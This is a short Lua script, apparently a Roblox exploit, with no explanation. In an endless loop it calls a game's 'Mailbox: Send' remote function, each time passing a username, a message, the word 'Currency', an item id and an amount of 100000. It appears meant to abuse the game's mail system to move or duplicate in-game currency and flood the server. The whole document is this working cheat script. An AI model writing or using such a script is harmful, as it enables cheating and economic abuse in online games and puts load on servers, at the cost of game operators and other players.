while true do 
local args = {
    [1] = "lolllllrjobtj",
    [2] = "Hi",
    [3] = "Currency",
    [4] = "6e0e7fe16b334f9d81bc1dcb20e3ef25",
    [5] = 100000
}

game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))

end
